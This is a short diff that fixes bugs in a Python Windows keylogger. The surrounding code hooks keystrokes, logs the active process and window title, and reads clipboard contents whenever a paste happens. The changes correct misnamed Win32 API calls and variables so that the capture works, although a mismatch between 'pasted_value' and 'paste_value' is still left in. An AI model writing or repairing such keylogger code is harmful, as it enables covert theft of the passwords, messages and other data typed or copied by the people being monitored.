@@ -13,14 +13,14 @@ def get_current_process():
     hwnd = user32.GetForegroundWindow()
     
     pid = c_ulong(0)
-    user32.GetWindowThreadprocessID(hwnd, byref(pid))
+    user32.GetWindowThreadProcessId(hwnd, byref(pid))
     
     process_id = "%d" % pid.value
     
-    execute = create_string_buffer("\x00" * 512)
+    executable = create_string_buffer("\x00" * 512)
     h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
     
-    psapi.GetModuleBaseNameA(h_process, None, byref(execute), 512)
+    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
     
     window_title = create_string_buffer("\x00" * 512)
     length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
@@ -36,7 +36,7 @@ def keyStroke(event):
     global current_window
     
     if event.WindowName != current_window:
-        current_window = event.Name
+        current_window = event.WindowName
         get_current_process()
         
     if event.Ascii > 32 and event.Ascii < 127:
@@ -45,7 +45,7 @@ def keyStroke(event):
         if event.Key == "V":
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipboardData()
-            win32clipboard.Close()Clipboard()
+            win32clipboard.CloseClipboard()
             
             print "[PASTE] - %s" % (paste_value),
         else:
